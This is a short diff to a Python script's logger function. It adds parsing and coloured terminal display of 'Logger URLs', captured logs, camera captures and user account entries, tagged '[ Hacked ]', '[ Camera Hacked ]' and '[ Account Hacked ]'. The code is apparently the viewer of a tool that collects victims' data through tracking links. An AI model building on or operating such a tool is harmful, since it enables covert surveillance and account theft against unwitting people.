@@ -78,6 +78,28 @@ def logger(name):
 	client.create()
 	while True:
 		data = client.show()
+		loggers = data.split("Logger URLs:\n")[1].split("\n\n")[0].split("\n")
+		logshow = data.split("Show Logs URL: ")[1].split("\n")[0]
+		logs = data.split("Logs:\n\n")[1].split("Capture Logs:\n\n")[0].split("\n\n")
+		caplogs = data.split("Capture Logs:\n\n")[1].split("\nUser Logs:")[0].split("\n\n")
+		userlogs = data.split("\nUser Logs:\n\n")[1].split("\n")
+		data = f"Aertlog Logs Display: \033[92m{logshow}\033[0m\n\n"
+		for url, n in zip(loggers, range(len(loggers))):
+			data += f"\033[91m[ $ ]\033[0m Logger URL {n+1}: \033[92m{url}\033[0m\n"
+		data += "\n"
+		for log in logs:
+			if log != "Capture ":
+				if len(log) >= 2:
+					data += f"\033[92m[ Hacked ]\033[0m {log}\n"
+		data += "\n"
+		for log in caplogs:
+			if len(log) >= 2:
+				data += f"\033[94m[ Camera Hacked ]\033[0m {log}\n"
+		data += "\n"
+		for log in userlogs:
+			if len(log) >= 2:
+				data += f"\033[93m[ Account Hacked ]\033[0m {log}\n"
+		data += "\n"
 		if os.name == "nt":
 			os.system("cls")
 		else:
